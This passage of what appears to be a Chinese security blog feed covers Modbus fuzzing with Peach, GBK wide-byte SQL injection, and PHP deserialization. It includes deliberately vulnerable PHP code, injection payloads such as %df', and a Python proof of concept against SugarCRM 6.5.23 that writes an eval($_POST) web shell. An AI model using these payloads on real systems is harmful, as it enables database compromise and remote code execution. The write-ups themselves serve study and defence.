<p>由官方文档最终得到如下Agent<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;Agent name=&quot;Local&quot;&gt;</span><br><span class="line">       &lt;Monitor class=&quot;Socket&quot;&gt;</span><br><span class="line">			&lt;Param name=&quot;Host&quot; value=&quot;192.168.1.100&quot; /&gt;</span><br><span class="line">			&lt;Param name=&quot;Port&quot; value=&quot;502&quot; /&gt;</span><br><span class="line">       &lt;/Monitor&gt;</span><br><span class="line">&lt;/Agent&gt;</span><br></pre></td></tr></table></figure></p>
<p>在TEST模块里引用Agent模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;Test name=&quot;Default&quot;&gt;</span><br><span class="line">	&lt;StateModel ref=&quot;ModbusStateModel&quot; /&gt;</span><br><span class="line">	</span><br><span class="line">	&lt;Agent ref=&quot;Local&quot; /&gt;</span><br><span class="line">	</span><br><span class="line">	&lt;Logger class=&quot;File&quot;&gt;</span><br><span class="line">		&lt;Param name=&quot;Path&quot; value=&quot;c:\log1&quot;/&gt;</span><br><span class="line">	&lt;/Logger&gt;</span><br><span class="line">	&lt;Publisher class=&quot;tcp.Tcp&quot;&gt;</span><br><span class="line">		&lt;Param name=&quot;Host&quot; value=&quot;192.168.1.100&quot;/&gt;</span><br><span class="line">		&lt;Param name=&quot;Port&quot; value=&quot;502&quot;/&gt;</span><br><span class="line">	&lt;/Publisher&gt;</span><br><span class="line">&lt;/Test&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="运行测试">运行测试</span></h3><p>先简单的说明下这个Pit的基本原理就是给工控设备发送合法的功能码，然后对数据部分进行变异。在这个过程用监听器监听，如果出现崩溃就会出现崩溃日志。这个过程是很漫长的过程，经过我跟Modbus Peach Fuzz的前辈进行的交流，得知他们的模糊测试点都是经过逆向找到的，所以Pit是不能发给我的。而我们这边目前只能对功能码进行模糊测试。据我了解对Modbus协议的模糊测试，需要先提取固件，然后对固件逆向分析，找到模糊测试的点，国内做的很少。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/peachfuzz5.png" alt=""></p>
<h2><span id="github-link">Github Link</span></h2><p><a href="https://github.com/uknowsec/ModbusPeachPit" target="_blank" rel="noopener">Modbus Peach Pit</a></p>
<h2><span id="reference">Reference</span></h2><p><a href="https://github.com/jseidl/peach-pit" target="_blank" rel="noopener">Github Peach Fuzzer PIT Files</a><br><a href="http://community.peachfuzzer.com/v3/PeachPit.html" target="_blank" rel="noopener">PeachPit官方文档</a><br><a href="http://blog.nsfocus.net/peach-fuzz/" target="_blank" rel="noopener">浅析Peach Fuzz</a><br><a href="http://www.freebuf.com/articles/security-management/88249.html" target="_blank" rel="noopener">工控网络协议模糊测试：用peach对modbus协议进行模糊测试</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[宽字节注入漏洞的利用与学习]]></title>
      <url>https://uknowsec.cn/posts/notes/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="基础知识">基础知识</span></h2><h3><span id="字符-字符集与字符序">字符、字符集与字符序</span></h3><p>字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。</p>
<p>字符序(collation)指同一字符集内字符间的比较规则。</p>
<h3><span id="宽字节">宽字节</span></h3><p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象。</p>
<h3><span id="gbk编码取值范围">GBK编码取值范围</span></h3><p>GBK采用双字节表示，总体编码范围为8140-FEFE，首字节在81-FE 之间，尾字节在40-FE 之间</p>
<h3><span id="gb2313编码取值范围">GB2313编码取值范围</span></h3><p>gb2312编码的取值范围。它的高位范围是0xA1~0xF7，低位范围是0xA1~0xFE</p>
<h3><span id="mysql的字符集转换过程">MYSQL的字符集转换过程</span></h3><ol>
<li><p>MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection;</p>
</li>
<li><p>进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</p>
</li>
</ol>
<ul>
<li>使用每个数据字段的CHARACTER SET设定值;</li>
<li>若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准);</li>
<li>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值;</li>
<li>若上述值不存在，则使用character_set_server设定值。</li>
</ul>
<p>将操作结果从内部操作字符集转换为character_set_results。</p>
<p>重点：宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码。</p>
<h3><span id="addslashes">addslashes()</span></h3><p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
<h4><span id="语法">语法：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes(string)</span><br></pre></td></tr></table></figure>
<h4><span id="参数说明">参数说明：</span></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
</tbody>
</table>
<h3><span id="mysql_real_escape_string">mysql_real_escape_string()</span></h3><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span><br></pre></td></tr></table></figure>
<h4><span id="语法">语法：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string(string,connection)</span><br></pre></td></tr></table></figure>
<h4><span id="参数说明">参数说明：</span></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string</td>
<td style="text-align:center">必需。规定要转义的字符串。</td>
</tr>
<tr>
<td>connection</td>
<td style="text-align:center">可选。规定 MySQL 连接。如果未规定，则使用上一个连接。</td>
</tr>
</tbody>
</table>
<h3><span id="incov">incov()</span></h3><p>(PHP 4 &gt;= 4.0.5, PHP 5, PHP 7)<br>iconv — 字符串按要求的字符编码来转换</p>
<h4><span id="语法">语法：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string iconv ( string $in_charset , string $out_charset , string $str )</span><br></pre></td></tr></table></figure>
<p>将字符串 str 从 in_charset 转换编码到 out_charset。</p>
<h4><span id="参数说明">参数说明：</span></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>in_charset</td>
<td style="text-align:center">输入的字符集。</td>
</tr>
<tr>
<td>out_charset</td>
<td style="text-align:center">输出的字符集。</td>
</tr>
<tr>
<td>str</td>
<td style="text-align:center">要转换的字符串。</td>
</tr>
</tbody>
</table>
<h3><span id="相关字符集设置">相关字符集设置</span></h3><ul>
<li>character_set_client:客户端发送过来的SQL语句编码，也就是PHP发送的SQL查询语句编码字符集。</li>
<li>character_set_connection:MySQL服务器接收客户端SQL查询语句后，在实施真正查询之前SQL查询语句编码字符集。</li>
<li>character_set_database:数据库缺省编码字符集。</li>
<li>character_set_filesystem:文件系统编码字符集。</li>
<li>character_set_results:SQL语句执行结果编码字符集。</li>
<li>character_set_server:服务器缺省编码字符集。</li>
<li>character_set_system:系统缺省编码字符集。</li>
<li>character_sets_dir:字符集存放目录，一般不要修改</li>
</ul>
<h2><span id="宽字节注入原理">宽字节注入原理</span></h2><p>　　GBK 占用两字节</p>
<p>　　ASCII占用一字节</p>
<p>　　PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。</p>
<p>　　输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。</p>
<p>　　%DF’ ：会被PHP当中的addslashes函数转义为“%DF\’” ，“\”既URL里的“%5C”，那么也就是说，“%DF’”会被转成“%DF%5C%27”倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符。也就是“縗’”</p>
<h2><span id="mysql中的宽字节注入">MySQL中的宽字节注入</span></h2><h3><span id="测试代码">测试代码</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//连接数据库部分，注意使用了gbk编码</span><br><span class="line">$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;uknow&apos;) or die(&apos;bad!&apos;);</span><br><span class="line">mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;);</span><br><span class="line">mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</span><br><span class="line">//执行sql语句</span><br><span class="line">$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE tid=&apos;&#123;$id&#125;&apos;&quot;;</span><br><span class="line">$result = mysql_query($sql, $conn) or die(mysql_error());</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;gbk&quot; /&gt;</span><br><span class="line">&lt;title&gt;新闻&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line">echo &quot;&lt;h2&gt;&#123;$row[&apos;title&apos;]&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row[&apos;content&apos;]&#125;&lt;p&gt;\n&quot;;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="利用过程">利用过程</span></h3><p>SQL语句是SELECT * FROM news WHERE tid=’{$id}’，就是根据文章的id把文章从news表中取出来。</p>
<p>在这个sql语句前面，使用了一个addslashes函数，将$id的值转义。这是通常cms中对sql注入进行的操作，只要输入参数在单引号中，就逃逸不出单引号的限制，无法注入，</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sql1.png" alt=""><br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sql2.png" alt=""></p>
<p>一般绕过addslashes的方式就是，想办法处理\’前面的\：</p>
<ul>
<li>1.想办法给\前面再加一个\（或单数个即可），变成\’，这样\被转义了，’逃出了限制</li>
<li>2.想办法把\弄没有。<br>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）。如果输入%df’看会怎样：</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sql3.png" alt=""><br>其中的�\是一个汉字  我们可以改成其他的。根据gbk编码，第一个字节ascii码大于128，基本上就可以了。比如我们不用%df，用%dd也可以：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sql4.png" alt=""></p>
<p>为什么从刚才到现在，只是在’也就是%27前面加了一个%df就报错了？而且从图中可以看到，报错的原因就是多了一个单引号，而单引号前面的反斜杠不见了。</p>
<p>这就是mysql的特性，因为gbk是多字节编码，他认为两个字节代表一个汉字，所以%df和后面的\也就是%5c变成了一个汉字“輁”，而’逃逸了出来。</p>
<p>因为两个字节代表一个汉字，所以我们可以试试%df%df%27：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sql5.png" alt=""></p>
<p>不报错了。因为%df%df是一个汉字，%5c%27不是汉字，仍然是\’。</p>
<p>我们可以利用宽字节注入的特点进行手注，也可以在url后面加上%df’丢给sqlmap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/1/0x01/index.php?id=1%df&apos;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sql6.png" alt=""></p>
<h2><span id="gb2312与gbk的不同">GB2312与GBK的不同</span></h2><p>GB2312也是属于宽字节，那么使用GB2312连接数据库，看能否进行宽字节注入</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sql7.png" alt=""></p>
<p>结果就是不能注入了：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sql8.png" alt=""></p>
<p>gb2312编码的取值范围。它的高位范围是0xA1~0xF7，低位范围是0xA1~0xFE，而\是0x5c，是不在低位范围中的。所以，0x5c根本不是gb2312中的编码，所以自然也是不会被吃掉的。</p>
<h2><span id="宽字符注入的修复">宽字符注入的修复</span></h2><ul>
<li>将character_set_client设置为binary（二进制）<br>只需在所有sql语句前指定一下连接的形式是二进制：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>当mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。</p>
<p>然后，当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。</p>
<p>所以，将character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sql10.png" alt=""></p>
<p>已经不能注入了<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sql9.png" alt=""></p>
<h2><span id="inconv导致的致命后果">inconv导致的致命后果</span></h2><h3><span id="测试代码">测试代码</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//连接数据库部分，注意使用了gbk编码</span><br><span class="line">$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;toor!@#$&apos;) or die(&apos;bad!&apos;);</span><br><span class="line">mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;);</span><br><span class="line">mysql_select_db(&apos;test&apos;, $conn) OR emMsg(&quot;连接数据库失败，未找到您填写的数据库&quot;);</span><br><span class="line">//执行sql语句</span><br><span class="line">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); </span><br><span class="line">$id = isset($_GET[&apos;id&apos;]) ? addslashes($_GET[&apos;id&apos;]) : 1;</span><br><span class="line">$id = iconv(&apos;utf-8&apos;, &apos;gbk&apos;, $id);</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE tid=&apos;&#123;$id&#125;&apos;&quot;;</span><br><span class="line">$result = mysql_query($sql, $conn) or die(mysql_error());</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;gbk&quot; /&gt;</span><br><span class="line">&lt;title&gt;新闻&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$row = mysql_fetch_array($result, MYSQL_ASSOC);</span><br><span class="line">echo &quot;&lt;h2&gt;&#123;$row[&apos;title&apos;]&#125;&lt;/h2&gt;&lt;p&gt;&#123;$row[&apos;content&apos;]&#125;&lt;p&gt;\n&quot;;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到，它在sql语句执行前，将character_set_client设置成了binary，所以可以避免宽字符注入的问题。但之后其调用了iconv将已经过滤过的参数$id给转换了一下。</p>
<p>给id参数一个值：錦’<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sql11.png" alt=""></p>
<p>报错了。说明可以注入。</p>
<p>“錦“这个字，它的utf-8编码是0xe98ca6，它的gbk编码是0xe55c。<br>\的ascii码正是5c。那么，当我们的錦被iconv从utf-8转换成gbk后，变成了%e5%5c，而后面的’被addslashes变成了%5c%27，这样组合起来就是%e5%5c%5c%27，两个%5c就是\，正好把反斜杠转义了，导致’逃逸出单引号，产生注入。</p>
<p>正利用了绕过addslashes的两种方式的第一种：将\转义掉。</p>
<h2><span id="reference">Reference</span></h2><p><a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html" target="_blank" rel="noopener">浅析白盒审计中的字符编码及SQL注入</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[反序列化漏洞的利用与学习]]></title>
      <url>https://uknowsec.cn/posts/notes/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="php反序列化漏洞">PHP反序列化漏洞</span></h2><h3><span id="基本概念">基本概念</span></h3><p>漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码有能够被我们控制，漏洞就这样产生了，根据不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。</p>
<h3><span id="漏洞代码">漏洞代码</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PHP反序列化&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">	var $a = &quot;test&quot;;</span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		$fp = fopen(&quot;E:\\phpStudy\\WWW\\1.php&quot;,&quot;w&quot;);</span><br><span class="line">		fputs($fp,$this-&gt;a);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = $_POST[&apos;test&apos;];</span><br><span class="line">$test_unser = unserialize($test);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>上述代码使用了php的magic方法destruct（详情参考<a href="http://php.net/manual/en/language.oop5.magic.php" target="_blank" rel="noopener">PHP: Magic Methods</a>），而destruct是当一个对象被销毁时被自动调用的析构方法。<br>然后unserialize中参数可控，这样我们就可以构造一个序列化的对象A来控制其中的变量a的值，最终会产生漏洞。</p>
<h3><span id="漏洞利用">漏洞利用</span></h3><p>构造一个序列化的对象A并给其中变量a赋值为&lt;?php phpinfo();?&gt;如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test=O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/php1.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/php2.png" alt=""><br>如上成功将&lt;?php phpinfo();?&gt;写入1.php.</p>
<h3><span id="实例利用">实例利用</span></h3><h4><span id="基础准备">基础准备</span></h4><p>PHP之前爆出了一个漏洞（<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">CVE-2016-7124</a> ），简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。Demo如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PHP&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">	var $a = &quot;test&quot;;</span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		$fp = fopen(&quot;E:\\phpStudy\\WWW\\1.php&quot;,&quot;w&quot;);</span><br><span class="line">		fputs($fp,$this-&gt;a);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">	function __wakeup()</span><br><span class="line">    	&#123;</span><br><span class="line">        	foreach(get_object_vars($this) as $k =&gt; $v) &#123;</span><br><span class="line">            		$this-&gt;$k = null;</span><br><span class="line">        	&#125;</span><br><span class="line">        	echo &quot;Waking up...\n&quot;;</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = $_POST[&apos;test&apos;];</span><br><span class="line">$test_unser = unserialize($test);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>我们再次使用之前的payload测试，结果如下：<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/php3.png" alt=""><br>发现__wakeup函数成功执行，清除了对象属性，从而1.php内容也为空了。</p>
<h4><span id="漏洞利用">漏洞利用</span></h4><p>根据CVE-2016-7124的原理，将上面payload中A的个数变成2或者大于2的数字如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test=O:1:”A”:2:&#123;s:1:”a”;s:18:”&lt;?php phpinfo();?&gt;”;&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后再次执行发现绕过了__wakeup函数，成功将phpinfo()写入1.php<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/php4.png" alt=""></p>
<h4><span id="sugarcrm-v6523-php反序列化">SugarCRM v6.5.23 PHP反序列化</span></h4><p>漏洞分析：<a href="http://paper.seebug.org/39/" target="_blank" rel="noopener">SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a><br>漏洞环境：<a href="https://github.com/sugarcrm/sugarcrm_dev/tree/6.5.23/" target="_blank" rel="noopener">SugarCRM v6.5.23</a></p>
<p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests as req</span><br><span class="line"></span><br><span class="line">url = &apos;http://127.0.0.1/sugarcrm_dev-6.5.23/service/v4/rest.php&apos;</span><br><span class="line"></span><br><span class="line">data = &#123;  </span><br><span class="line">    &apos;method&apos;: &apos;login&apos;,</span><br><span class="line">    &apos;input_type&apos;: &apos;Serialize&apos;,</span><br><span class="line">    &apos;rest_data&apos;: &apos;O:+14:&quot;SugarCacheFile&quot;:23:&#123;S:17:&quot;\\00*\\00_cacheFileName&quot;;s:15:&quot;../custom/1.php&quot;;S:16:&quot;\\00*\\00_cacheChanged&quot;;b:1;S:14:&quot;\\00*\\00_localStore&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[\&apos;HHH\&apos;]); ?&gt;&quot;;&#125;&#125;&apos;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req.post(url, data=data)</span><br></pre></td></tr></table></figure></p>
<p>脚本执行后shell位于custom/1.php：<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/php5.png" alt=""></p>
<h2><span id="java反序列化漏洞待续">Java反序列化漏洞（待续）</span></h2><h2><span id="reference">Reference</span></h2><p><a href="http://paper.seebug.org/39/" target="_blank" rel="noopener">SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a><br><a href="http://www.cnblogs.com/test404/p/6486435.html" target="_blank" rel="noopener">PHP反序列化漏洞与CVE-2016-7124</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Web For Pentester I 练习笔记]]></title>
      <url>https://uknowsec.cn/posts/notes/Web-For-Pentester-I-%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="环境搭建">环境搭建</span></h2><p>ISO镜像:<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso" target="_blank" rel="noopener">web_for_pentester_i386.iso</a></p>
<p>新建虚拟机添加web_for_pentester_i386.iso镜像，桥接网络即可。</p>
<h2><span id="基础知识">基础知识</span></h2><h3><span id="preg_match">preg_match()</span></h3><p>preg_match() 函数用于进行正则表达式匹配，成功返回 1 ，否则返回 0 。</p>
<h4><span id="语法">语法：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int preg_match( string pattern, string subject [, array matches ] )</span><br></pre></td></tr></table></figure>
<h4><span id="参数说明">参数说明：</span></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>pattern</td>
<td style="text-align:center">正则表达式</td>
</tr>
<tr>
<td>subject</td>
<td style="text-align:center">需要匹配检索的对象</td>
</tr>
<tr>
<td>matches</td>
<td style="text-align:center">可选，存储匹配结果的数组， matches[0] 将包含与整个模式匹配的文本 matches[1] 将包含与第一个捕获的括号中的子模式所匹配的文本，以此类推</td>
</tr>
</tbody>
</table>
<h3><span id="preg_replace">preg_replace()</span></h3><p>preg_replace() 函数用于正则表达式的搜索和替换。</p>
<h4><span id="语法">语法：</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace( mixed pattern, mixed replacement, mixed subject [, int limit ] )</span><br></pre></td></tr></table></figure>
<h4><span id="参数说明">参数说明：</span></h4><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>pattern</td>
